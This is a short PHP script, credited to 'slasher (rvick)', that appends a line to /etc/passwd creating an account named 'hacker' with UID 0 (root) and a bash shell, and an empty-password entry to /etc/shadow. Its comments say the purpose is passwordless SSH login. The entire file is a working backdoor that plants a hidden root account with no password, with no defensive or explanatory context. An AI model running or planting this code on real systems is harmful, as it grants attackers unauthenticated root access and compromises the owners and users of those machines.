<?php
// Author: slasher (rvick) 
// Modified to allow SSH login without a password for the new user

// Content for /etc/passwd to create a user with no password
$passwdContent = "hacker:x:0:0::/root:/bin/bash\n";

// Content for /etc/shadow to ensure no password is set for the user
$shadowContent = "hacker::0::::::\n";

// Write to /etc/passwd
file_put_contents('/etc/passwd', $passwdContent, FILE_APPEND);

// Write to /etc/shadow to disable password check for the user
file_put_contents('/etc/shadow', $shadowContent, FILE_APPEND);
?>
